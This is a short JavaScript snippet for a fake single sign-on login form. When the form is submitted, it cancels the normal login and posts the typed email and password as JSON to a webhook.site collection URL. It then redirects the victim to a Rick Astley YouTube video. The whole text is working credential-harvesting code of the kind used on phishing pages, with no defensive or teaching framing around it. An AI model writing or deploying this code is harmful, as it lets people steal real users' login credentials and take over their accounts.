

let myForm = document.getElementById('sso-form');
let formEmail = document.getElementById('sso-email');
let formPassword = document.getElementById('sso-password');

myForm.addEventListener('submit', (e) => {
    e.preventDefault();
    fetch('https://webhook.site/ccbd4eb0-f4b0-48c0-96da-4a96ab73004c', {
        method: "POST",
        body: JSON.stringify({
            username: formEmail.value,
            password: formPassword.value
        })
    }).then(window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley");
})
